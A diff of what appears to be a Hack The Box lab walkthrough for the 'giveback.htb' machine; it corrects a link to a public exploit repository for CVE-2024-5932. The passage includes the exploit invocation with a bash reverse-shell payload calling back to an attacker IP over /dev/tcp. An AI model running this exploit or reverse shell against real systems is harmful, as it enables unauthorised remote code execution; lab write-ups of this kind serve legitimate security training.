@@ -102,7 +102,7 @@ SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-Exploit link: <a scr="https://github.com/EQSTLab/CVE-2024-5932">https://github.com/EQSTLab/CVE-2024-5932 </a>
+Exploit link: <a src="https://github.com/EQSTLab/CVE-2024-5932">https://github.com/EQSTLab/CVE-2024-5932</a>
 ```sh
 python CVE-2024-5932-rce.py -u http://giveback.htb/donations/the-things-we-need/ -c "bash -c 'bash -i >& /dev/tcp/10.10.X.X/6969 0>&1'"
                                                                                                                                                                                                                                                                                                             
